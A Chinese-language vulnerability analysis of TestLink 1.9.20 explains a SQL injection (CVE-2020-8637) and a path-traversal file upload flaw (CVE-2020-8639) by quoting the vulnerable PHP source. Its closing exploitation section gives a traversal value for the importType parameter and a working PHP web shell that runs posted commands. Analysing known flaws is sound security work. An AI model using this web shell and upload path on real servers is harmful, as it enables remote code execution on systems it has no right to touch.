# 漏洞实现方案

## SQL注入漏洞(CVE-2020-8637)

在TestLink的[dragdroptreenodes.php]( https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/ajax/dragdroptreenodes.php )代码

```php
function init_args()
{
  $args=new stdClass();
  $key2loop=array('nodeid','newparentid','doAction','top_or_bottom','nodeorder','nodelist');
  foreach($key2loop as $key)
  {
    $args->$key=isset($_REQUEST[$key]) ? $_REQUEST[$key] : null;
  }
  return $args;
}
```

 `nodeid`从中检索用户输入`$_REQUEST`并将其存储在中`$args->nodeid`。`change_parent`然后调用该方法： 

```php
$args=init_args();
$treeMgr = new tree($db);
switch($args->doAction)
{
    case 'changeParent':
        $treeMgr->change_parent($args->nodeid,$args->newparentid);
    break;
```

 方法定义在[tree.class.php中](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/tree.class.php) 

```php
function change_parent($node_id, $parent_id)
  {
    $debugMsg='Class:' .__CLASS__ . ' - Method:' . __FUNCTION__ . ' :: ';
    if( is_array($node_id) )
    {
      $id_list = implode(",",$node_id);
      $where_clause = " WHERE id IN ($id_list) ";
    }
    else
    {
      $where_clause=" WHERE id = {$node_id}";
    }
    $sql = "/* $debugMsg */ UPDATE {$this->object_table} " .
           " SET parent_id = " . $this->db->prepare_int($parent_id) . " {$where_clause}";
    $result = $this->db->exec_query($sql);
    return $result ? 1 : 0;
  }
```

 正如您在源代码中看到的那样，`$node_id`串联在`WHERE`SQL语句的中，从而可以操纵`SQL`语法。 

## 文件上传漏洞(CVE-2020-8639)

` Teslink`提供了使用关键字对测试案例进行分类的可能性。这些关键字可以导出和导入，在此操作中，我们发现了第一个漏洞 

允许我们上传一个包含关键字的文件，通过选择，`File type`我们可以在XML或`CSV`格式之间进行选择。现在让我们来看一下[关键字](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/keywords/keywordsImport.php)` keywordImport.php`中`init_args`方法的实现。 

```php
function init_args(&$dbHandler)
{
  $_REQUEST = strings_stripSlashes($_REQUEST);
  $ipcfg = array("UploadFile" => array(tlInputParameter::STRING_N,0,1),
                 "importType" => array(tlInputParameter::STRING_N,0,100),
                 "tproject_id" => array(tlInputParameter::INT_N));
  $args = new stdClass();
  R_PARAMS($ipcfg,$args);
  if( $args->tproject_id <= 0 )
  {
    throw new Exception(" Error Invalid Test Project ID", 1);
  }
  // Check rights before doing anything else
  // Abort if rights are not enough
  $user = $_SESSION['currentUser'];
  $env['tproject_id'] = $args->tproject_id;
  $env['tplan_id'] = 0;
  $check = new stdClass();
  $check->items = array('mgt_modify_key');
  $check->mode = 'and';
  checkAccess($dbHandler,$user,$env,$check);
  $tproj_mgr = new testproject($dbHandler);
  $dm = $tproj_mgr->get_by_id($args->tproject_id,array('output' => 'name'));
  $args->tproject_name = $dm['name'];
  $args->UploadFile = ($args->UploadFile != "") ? 1 : 0;
  $args->fInfo = isset($_FILES['uploadedFile']) ? $_FILES['uploadedFile'] : null;
  $args->source = isset($args->fInfo['tmp_name']) ? $args->fInfo['tmp_name'] : null;
  $args->dest = TL_TEMP_PATH . session_id() . "-importkeywords." . $args->importType;
  return $args;
}
```

首先，[strings_stripSlashes](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/2f6a6f4dd0cd500258f0f4ddf0eeb3fd93714433/lib/functions/common.php#L547)方法(在`testlink-code/lib/functions/common.php`的第547~577 )取消引用所有引用的字符串值`$_REQUEST`。

```php
function strings_stripSlashes($parameter,$bGPC = true)
{
  if ($bGPC && !ini_get('magic_quotes_gpc'))
  { 
    return $parameter;
  }

  if (is_array($parameter))
  {
    $retParameter = null;
    if (sizeof($parameter))
    {
      foreach($parameter as $key=>$value)
      {
        if (is_array($value))
        {  
          $retParameter[$key] = strings_stripSlashes($value,$bGPC);
        }
        else
        {  
          $retParameter[$key] = stripslashes($value);
        }  
      }
    }
    return $retParameter;
  }
  else
  {  
    return stripslashes($parameter);
  }  
}
```



然后使用[R_PARAMS](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/2f6a6f4dd0cd500258f0f4ddf0eeb3fd93714433/lib/functions/inputparameter.inc.php#L99)(testlink-code/lib/functions/inputparameter.inc.php第99~102行 )方法`$ipcfg`从中检索定义的参数，`REQUEST`并将其存储在中`$args`。

```php
function R_PARAMS($paramInfo,&$args = null)
{
	return GPR_PARAMS("REQUEST",$paramInfo,$args);
}
```

第114~121行

```php
function GPR_PARAMS($source,$paramInfo,&$args = null)
{
	foreach($paramInfo as $pName => &$info)
	{
		array_unshift($info,$source);
	}
	return I_PARAMS($paramInfo,$args);
}
```



上传的文件存储在中`$args->source`，的值`$args->importType`连接在中`$args->dest`。没有什么可以阻止我们更改`importType` 的值为`/../../any/folder/we/want`。换句话说，此参数容易受到路径遍历的影响。

现在让我们看看在哪里`$args->dest`使用：

```php
$args = init_args($db);
$gui = initializeGui($args);
if(!$gui->msg && $args->UploadFile)
{
  if(($args->source != 'none') && ($args->source != ''))
  {
    if (move_uploaded_file($args->source, $args->dest))
```

 它在[move_uploaded_file](https://www.php.net/manual/en/function.move-uploaded-file.php)中使用，因此我们可以随意修改文件上传的地址，可以在服务器的任何目录中上传文件。 

### 文件上传漏洞利用

利用此漏洞的一种方法是上传一个`Webshell`，以在部署`Testlink`的服务器上进行远程代码执行。为此，我们需要在运行`Testlink`的系统用户具有写权限的服务器上找到一个路径（例如，/ logs）。

`importType`字段的值修改为`/../../../logs/ws.php`，我们需要`uploadedFile`在`PHP` 的变量中传递`webshell`的代码。例如:

```php
<html>
    <body>
        <form method="POST">
            <input name="command" id="command" />
            <input type="submit" value="Send" />
        </form>
        <pre>
            <?php if(isset($_POST['command']))
        {
            system($_POST['command']);
        } ?>
        </pre>
    </body>
</html>
```

通过访问`http://your-ip:port/logs/ws.php`实现远程代码执行